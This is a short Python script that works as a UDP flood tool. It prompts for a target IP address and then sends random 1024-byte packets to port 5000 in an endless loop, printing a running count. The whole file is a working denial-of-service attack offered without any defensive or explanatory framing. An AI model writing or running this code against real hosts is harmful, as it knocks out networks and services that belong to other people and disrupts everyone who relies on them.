import socket
import random
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
bytes_data = random._urandom(1024)  

ip = input("Enter your target IP:\n>>>")
port = 5000
sent = 0

while True:
    try:
        sock.sendto(bytes_data, (ip, port))
        sent += 1
        print("Sent {} packets to {} at port {}.".format(sent, ip, port))
    except Exception as e:
        print("Error encountered: {}".format(e))
        time.sleep(0.1)
